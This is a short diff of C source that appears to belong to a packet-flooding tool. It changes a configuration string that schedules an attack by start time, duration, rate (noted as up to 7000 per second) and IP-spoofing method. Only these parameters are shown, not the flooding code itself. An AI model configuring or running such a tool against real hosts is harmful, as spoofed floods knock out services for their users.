@@ -16,7 +16,7 @@ char attackTime[512] = "22:58:00.000000"   // Attark1 Start time;
 */
 
 // Fix attack duration & attack rate, change ip spoof method;
-char attackTime[512] = "16:00:00.000000"   // Attark1 Start time;
+char attackTime[1024] = "16:00:00.000000"   // Attark1 Start time;
 			"0010"             // Attack1 duration(seconds);
 			"5000"             // Attack1 attack rate(#/second);   (7000 Max)
 			"0"                // Attack1 IP Spoofing method; (0-No;1-Linear;2-Random)
